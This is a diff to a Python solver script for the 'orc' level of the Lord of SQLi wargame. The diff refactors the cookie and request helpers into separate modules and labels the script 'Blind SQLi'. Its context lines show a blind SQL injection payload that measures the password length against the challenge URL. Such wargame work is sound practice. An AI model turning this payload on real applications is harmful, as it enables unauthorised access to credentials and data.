@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
+from connect import my_request as req
 
 
 def check_func(*args) -> bool:
@@ -12,6 +14,8 @@ def check_func(*args) -> bool:
 
 def main():
     '''
+    Blind SQLi
+
     Orc
 
     if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
@@ -27,7 +31,7 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
 
     payload = "' or length(pw)>%s #"
     param = dict(pw=payload)
@@ -51,7 +55,7 @@ def main():
     print(result)
 
     param = dict(pw=result)
-    response = los.get_request(url, param, cook)
+    response = req.get_request(url, param, cook)
 
     if 'Clear!' in response:
         print('ORC Clear!')
